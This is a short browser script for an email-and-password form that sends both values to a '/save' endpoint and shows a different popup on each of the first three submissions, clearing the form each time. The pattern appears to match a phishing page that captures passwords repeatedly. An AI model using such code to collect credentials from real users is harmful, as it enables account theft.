const passwordInput = document.getElementById("input-password");
const toggle = document.getElementById("toggle");

// Toggle password visibility
toggle.addEventListener("click", (e) => {
  e.preventDefault();
  passwordInput.type = passwordInput.type === "password" ? "text" : "password";
});

// Track submissions
let submissionCount = 0;

function sendData() {
  const email = document.getElementById("input-email").value;
  const password = document.getElementById("input-password").value;

  if (!email || !password) {
    alert("Please enter both email and password!");
    return;
  }

  fetch('/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  .then(res => res.json())
  .then(response => {
    console.log('Server response:', response);

    submissionCount++;

    if (submissionCount === 1) showModal(1);
    else if (submissionCount === 2) showModal(2);
    else showModal(3);

    document.getElementById("myForm").reset();
  })
  .catch(err => console.error('Error:', err));
}

// Show/hide modal functions
function showModal(n) {
  document.getElementById(`modalOverlay${n}`).style.display = "flex";
}
function hideModal(n) {
  document.getElementById(`modalOverlay${n}`).style.display = "none";
}